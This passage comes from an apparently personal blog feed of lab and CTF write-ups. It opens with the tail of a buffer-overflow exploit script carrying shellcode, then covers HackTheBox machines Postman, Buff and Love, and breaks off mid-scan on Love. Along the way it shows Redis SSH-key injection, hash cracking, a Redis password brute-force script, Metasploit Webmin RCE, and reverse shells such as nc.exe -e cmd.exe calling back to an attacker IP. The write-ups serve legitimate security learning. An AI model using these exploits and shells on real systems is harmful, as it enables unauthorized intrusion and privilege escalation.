class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;\xaf\x11\x50\x62&quot;</span></span><br><span class="line">padding = <span class="string">&quot;\x90&quot;</span> * <span class="number">16</span></span><br><span class="line">payload = <span class="string">&quot;\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xc4\xab\x18\x83\x83\xee\xfc\xe2\xf4\x38\x43\x9a\x83\xc4\xab\x78\x0a\x21\x9a\xd8\xe7\x4f\xfb\x28\x08\x96\xa7\x93\xd1\xd0\x20\x6a\xab\xcb\x1c\x52\xa5\xf5\x54\xb4\xbf\xa5\xd7\x1a\xaf\xe4\x6a\xd7\x8e\xc5\x6c\xfa\x71\x96\xfc\x93\xd1\xd4\x20\x52\xbf\x4f\xe7\x09\xfb\x27\xe3\x19\x52\x95\x20\x41\xa3\xc5\x78\x93\xca\xdc\x48\x22\xca\x4f\x9f\x93\x82\x12\x9a\xe7\x2f\x05\x64\x15\x82\x03\x93\xf8\xf6\x32\xa8\x65\x7b\xff\xd6\x3c\xf6\x20\xf3\x93\xdb\xe0\xaa\xcb\xe5\x4f\xa7\x53\x08\x9c\xb7\x19\x50\x4f\xaf\x93\x82\x14\x22\x5c\xa7\xe0\xf0\x43\xe2\x9d\xf1\x49\x7c\x24\xf4\x47\xd9\x4f\xb9\xf3\x0e\x99\xc3\x2b\xb1\xc4\xab\x70\xf4\xb7\x99\x47\xd7\xac\xe7\x6f\xa5\xc3\x54\xcd\x3b\x54\xaa\x18\x83\xed\x6f\x4c\xd3\xac\x82\x98\xe8\xc4\x54\xcd\xd3\x94\xfb\x48\xc3\x94\xeb\x48\xeb\x2e\xa4\xc7\x63\x3b\x7e\x8f\xe9\xc1\xc3\x12\x92\xee\xcb\x70\x81\xc4\xae\x21\x0a\x22\xc1\x08\xd5\x93\xc3\x81\x26\xb0\xca\xe7\x56\x41\x6b\x6c\x8f\x3b\xe5\x10\xf6\x28\xc3\xe8\x36\x66\xfd\xe7\x56\xac\xc8\x75\xe7\xc4\x22\xfb\xd4\x93\xfc\x29\x75\xae\xb9\x41\xd5\x26\x56\x7e\x44\x80\x8f\x24\x82\xc5\x26\x5c\xa7\xd4\x6d\x18\xc7\x90\xfb\x4e\xd5\x92\xed\x4e\xcd\x92\xfd\x4b\xd5\xac\xd2\xd4\xbc\x42\x54\xcd\x0a\x24\xe5\x4e\xc5\x3b\x9b\x70\x8b\x43\xb6\x78\x7c\x11\x10\xe8\x36\x66\xfd\x70\x25\x51\x16\x85\x7c\x11\x97\x1e\xff\xce\x2b\xe3\x63\xb1\xae\xa3\xc4\xd7\xd9\x77\xe9\xc4\xf8\xe7\x56&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常记录&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="TryHackMe" scheme="https://yoloyolo.top/tags/TryHackMe/"/>
    
    <category term="BufferOverflow" scheme="https://yoloyolo.top/tags/BufferOverflow/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox_All_In_One</title>
    <link href="https://yoloyolo.top/2023/04/02/HackTheBox-All-In-One/"/>
    <id>https://yoloyolo.top/2023/04/02/HackTheBox-All-In-One/</id>
    <published>2023-04-02T11:31:08.000Z</published>
    <updated>2023-07-16T09:03:48.683Z</updated>
    
    <content type="html"><![CDATA[<p>HackTheBox合集</p><a id="more"></a><h1 id="hackthebox_postman"><a class="markdownIt-Anchor" href="#hackthebox_postman"></a> HackTheBox_Postman</h1><p><code>2020/01/15 19:55:48</code></p><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><p><code>nmap -sV -Pn -p 1-10000 -T5 -n -v -A 10.10.10.160</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.160</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 9326 closed ports, 672 filtered ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">6379/tcp  open  redis   Redis key-value store 4.0.9</span><br><span class="line">10000/tcp open  http    MiniServ 1.910 (Webmin httpd)</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: MiniServ/1.910</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html; Charset=iso-8859-1).</span></span><br><span class="line"><span class="string">Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), Linux 3.18 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Android 4.1.1 (92%), Android 4.1.2 (92%), Android 4.2.2 (Linux 3.4) (92%)</span></span><br><span class="line"><span class="string">No exact OS matches for host (test conditions non-ideal).</span></span><br></pre></td></tr></table></figure><h3 id="web路径枚举"><a class="markdownIt-Anchor" href="#web路径枚举"></a> Web路径枚举</h3><p>尝试爆破80端口下的Web路径<br />未发现有效信息</p><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>尝试直接登入redis服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.10.10.160</span><br></pre></td></tr></table></figure><p>利用redis未授权写入ssh密钥，再用ssh登入redis账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rm -rf ~/.ssh/id*</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>;cat ~/.ssh/id_rsa.pub;<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; new.txt</span><br><span class="line">redis-cli -h 10.10.10.160 flushall</span><br><span class="line">cat new.txt | redis-cli -h 10.10.10.160 -x <span class="built_in">set</span> crackit</span><br><span class="line">redis-cli -h 10.10.10.160 config <span class="built_in">set</span> dir /var/lib/redis/.ssh/</span><br><span class="line">redis-cli -h 10.10.10.160 config <span class="built_in">set</span> dbfilename <span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">redis-cli -h 10.10.10.160 save</span><br><span class="line">ssh -i /root/.ssh/id_rsa redis@10.10.10.160</span><br></pre></td></tr></table></figure><p>无法在<code>/var/www/html/</code>目录下写入WebShell</p><p>发现文件<code>/opt/id_rsa.bak</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -l /opt</span><br><span class="line"></span><br><span class="line">total 4</span><br><span class="line">-rwxr-xr-x 1 Matt Matt 1743 Aug 26 00:11 id_rsa.bak</span><br></pre></td></tr></table></figure><p>可以确定是Matt账户的ssh密钥</p><p>拷贝到本地之后再用脚本转为john可以破解的密码形式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/john/ssh2john.py id_rsa.bak &gt; ssh</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt ssh</span><br><span class="line">    computer2008</span><br></pre></td></tr></table></figure><p>得到Matt账户的口令，使用SSH登入Matt账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh Matt@10.10.10.160</span><br><span class="line">computer2008</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><p>在MSF中搜索Webmin的相关漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">search webmin</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   #  Name                                         Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                         ---------------  ----       -----  -----------</span><br><span class="line">   0  auxiliary&#x2F;admin&#x2F;webmin&#x2F;edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access</span><br><span class="line">   1  auxiliary&#x2F;admin&#x2F;webmin&#x2F;file_disclosure       2006-06-30       normal     No     Webmin File Disclosure</span><br><span class="line">   2  exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution</span><br><span class="line">   3  exploit&#x2F;unix&#x2F;webapp&#x2F;webmin_backdoor          2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor</span><br><span class="line">   4  exploit&#x2F;unix&#x2F;webapp&#x2F;webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin &#x2F;file&#x2F;show.cgi Remote Command Execution</span><br><span class="line">   5  exploit&#x2F;unix&#x2F;webapp&#x2F;webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE</span><br></pre></td></tr></table></figure><p>MSF中调用漏洞利用工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rce</span><br><span class="line">set payload cmd&#x2F;unix&#x2F;reverse_netcat</span><br><span class="line">set LHOST 10.10.16.14</span><br><span class="line">set RHOSTS 10.10.10.160</span><br><span class="line">set USERNAME Matt</span><br><span class="line">set PASSWORD computer2008</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>获取root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><hr /><p>Redis登入之后，可以考虑写入一句话后门/phpinfo这个思路</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /var/www/html/</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> webshell <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>而这台靶机中无法在<code>/var/www/html/</code>目录下写入文件，提权也比较困难，只能写入SSH密钥</p><p>附：<br />Redis弱口令探测脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-  coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">PASSWORD_DIC=[<span class="string">&#x27;redis&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;oracle&#x27;</span>,<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;p@aaw0rd&#x27;</span>,<span class="string">&#x27;abc123!&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">ip, port, timeout</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        socket.setdefaulttimeout(timeout)</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, <span class="built_in">int</span>(port)))</span><br><span class="line">        s.send(<span class="string">&quot;INFO\r\n&quot;</span>)</span><br><span class="line">        result = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;redis_version&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">u&quot;未授权访问&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;Authentication&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">for</span> pass_ <span class="keyword">in</span> PASSWORD_DIC:</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip, <span class="built_in">int</span>(port)))</span><br><span class="line">                s.send(<span class="string">&quot;AUTH %s\r\n&quot;</span> %(pass_))</span><br><span class="line">                result = s.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;+OK&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">u&quot;存在弱口令，密码：%s&quot;</span> % (pass_)</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">    port=sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="built_in">print</span> check(ip,port, timeout=<span class="number">10</span>)</span><br></pre></td></tr></table></figure><hr /><p>nmap扫描速度巨慢，而且总是会扫漏几个端口，甚至扫全端口时总是会中途因为900s的数据包延迟而中断扫描…(体验极差)</p><p>Redis的操作完全没有接触过，十分生疏</p><p>Webmin的漏洞利用倒是异常的顺利</p><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">redis</a><br /><a href="https://mp.weixin.qq.com/s/xF8GsjumqZhGe2Ue2XppGw">wp</a></p></blockquote><hr /><h1 id="hackthebox_buff"><a class="markdownIt-Anchor" href="#hackthebox_buff"></a> HackTheBox_Buff</h1><p><code>2020/07/27 16:23:58</code></p><h2 id="前期工作"><a class="markdownIt-Anchor" href="#前期工作"></a> 前期工作</h2><p>连接服务器，服务器连接代理</p><p><img src="/images/hackthebox_buff/00.png" alt="" /></p><p>网络状态</p><p><img src="/images/hackthebox_buff/01.png" alt="" /></p><p>靶机</p><p><img src="/images/hackthebox_buff/02.png" alt="" /></p><p><img src="/images/hackthebox_buff/03.png" alt="" /></p><h2 id="信息收集-2"><a class="markdownIt-Anchor" href="#信息收集-2"></a> 信息收集</h2><h3 id="端口扫描-2"><a class="markdownIt-Anchor" href="#端口扫描-2"></a> 端口扫描</h3><p><code>nmap -sT -Pn --top-port 1000 -sV -T5 10.10.10.198</code></p><p><img src="/images/hackthebox_buff/04.png" alt="" /></p><h3 id="web路径扫描"><a class="markdownIt-Anchor" href="#web路径扫描"></a> Web路径扫描</h3><p><code>gobuster dir -w /usr/share/wordlists/directory-list-2.3-medium.txt -x .php -u http://10.10.10.198:8080/</code></p><p><img src="/images/hackthebox_buff/05.png" alt="" /></p><h2 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h2><p>代理浏览器</p><p><code>proxychains firefox</code></p><p>得到CMS相关信息</p><p><img src="/images/hackthebox_buff/06.png" alt="" /></p><p>搜索相关漏洞<br /><code>searchsploit Gym 1.0</code></p><p><img src="/images/hackthebox_buff/07.png" alt="" /></p><p>执行EXP<br /><code>proxychains python 48506.py http://10.10.10.198:8080/</code></p><p><img src="/images/hackthebox_buff/08.png" alt="" /></p><p>获取Shell</p><p><img src="/images/hackthebox_buff/09.png" alt="" /></p><h2 id="权限提升-2"><a class="markdownIt-Anchor" href="#权限提升-2"></a> 权限提升</h2><p>服务器开启HTTP服务<br /><code>pythom -m SimpleHTTPServer 9900</code></p><p><img src="/images/hackthebox_buff/10.png" alt="" /></p><p>下载nc与plink</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O http://10.10.16.4:9900/nc.exe</span><br><span class="line">curl -O http://10.10.16.4:9900/plink.exe</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox_buff/11.png" alt="" /></p><p>使用nc反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9999</span><br><span class="line">nc.exe -e cmd.exe 10.10.16.4 9999</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox_buff/12.png" alt="" /></p><p>后台进程中发现CloudMe<br /><code>tasklist | findstr CloudMe</code></p><p><img src="/images/hackthebox_buff/13.png" alt="" /></p><p>该进程在本地开启了8888端口<br /><code>netstat -ano | findstr 2556</code></p><p><img src="/images/hackthebox_buff/14.png" alt="" /></p><p>使用plink进行端口转发<br /><code>plink.exe -R 9901:127.0.0.1:8888 root@10.10.16.4 -pw YOUR_PASSWORD</code></p><p><img src="/images/hackthebox_buff/15.png" alt="" /></p><p>查看服务器端口<br /><code>netstat -antlp | grep 9901</code></p><p><img src="/images/hackthebox_buff/16.png" alt="" /></p><p>搜索相关漏洞<br /><code>searchsploit cloudme</code></p><p><img src="/images/hackthebox_buff/17.png" alt="" /></p><p>使用EXP <a href="http://44470.py">44470.py</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 44470.py</span><br><span class="line">cat 44470.py</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox_buff/18.png" alt="" /></p><p>使用msfvenom构造payload<br /><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=4444 -f c</code></p><p>修改payload，且修改端口为9901之后上传EXP至服务器<br /><code>scp 44470.py root@hk:/root/</code></p><p>监听端口4444<br /><code>nc -lvnp 4444</code></p><p>执行EXP<br /><code>python 44470.py</code></p><p>提权成功</p><p><img src="/images/hackthebox_buff/19.png" alt="" /></p><p>查看flag</p><p><img src="/images/hackthebox_buff/20.png" alt="" /></p><hr /><h1 id="hackthebox_love"><a class="markdownIt-Anchor" href="#hackthebox_love"></a> HackTheBox_love</h1><h2 id="端口扫描-3"><a class="markdownIt-Anchor" href="#端口扫描-3"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.239</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.239</span><br><span class="line">Host is up (0.87s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql?</span><br><span class="line">5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port3306-TCP:V=7.91%I=7%D=6/9%Time=60C04557%P=x86_64-pc-linux-gnu%r(NUL</span><br><span class="line">SF:L,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed</span></span><br><span class="line"><span class="string">SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(GenericLines,4</span><br><span class="line">SF:9,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x2</span></span><br><span class="line"><span class="string">SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(HTTPOptions,49,<span class="string">&quot;E</span></span><br><span class="line"><span class="string">SF:\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\</span></span><br><span class="line"><span class="string">SF:x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(RPCCheck,49,<span class="string">&quot;E\0\0\x0</span></span><br><span class="line"><span class="string">SF:1\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20conn</span></span><br><span class="line"><span class="string">SF:ect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(DNSStatusRequestTCP,49,<span class="string">&quot;E\0\</span></span><br><span class="line"><span class="string">SF:0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20</span></span><br><span class="line"><span class="string">SF:connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(TerminalServerCookie,49,</span><br><span class="line">SF:<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20t</span></span><br><span class="line"><span class="string">SF:o\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(Kerberos,49,<span class="string">&quot;E\0\0\</span></span><br><span class="line"><span class="string">SF:x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20co</span></span><br><span class="line"><span class="string">SF:nnect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(X11Probe,49,<span class="string">&quot;E\0\0\x01\xff</span></span><br><span class="line"><span class="string">SF:j\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x</span></span><br><span class="line"><span class="string">SF:20to\x20this\x20MariaDB\x20server&quot;</span>)%r(FourOhFourRequest,49,<span class="string">&quot;E\0\0\x01\x</span></span><br><span class="line"><span class="string">SF:ffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect</span></span><br><span class="line"><span class="string">SF:\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(LDAPSearchReq,49,<span class="string">&quot;E\0\0\x01\xff</span></span><br><span class="line"><span class="string">SF:j\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x</span></span><br><span class="line"><span class="string">SF:20to\x20this\x20MariaDB\x20server&quot;</span>)%r(LDAPBindReq,49,<span class="string">&quot;E\0\0\x01\xffj\x0</span></span><br><span class="line"><span class="string">SF:4Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x20to</span></span><br><span class="line"><span class="string">SF:\x20this\x20MariaDB\x20server&quot;</span>)%r(SIPOptions,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host</span></span><br><span class="line"><span class="string">SF:\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20t</span></span><br><span class="line"><span class="string">SF:his\x20MariaDB\x20server&quot;</span>)%r(TerminalServer,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\</span></span><br><span class="line"><span class="string">SF:x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20th</span></span><br><span class="line"><span class="string">SF:is\x20MariaDB\x20server&quot;</span>)%r(NCP,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.</span></span><br><span class="line"><span class="string">SF:16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaD</span></span><br><span class="line"><span class="string">SF:B\x20server&quot;</span>)%r(JavaRMI,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x</span></span><br><span class="line"><span class="string">SF:20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20ser</span></span><br><span class="line"><span class="string">SF:ver&quot;</span>);</span><br><span class="line">Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 443 10.10.10.239</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.239</span><br><span class="line">Host is up (0.75s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=<span class="keyword">in</span></span><br><span class="line">| Not valid before: 2021-01-18T14:00:16</span><br><span class="line">|_Not valid after:  2022-01-18T14:00:16</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 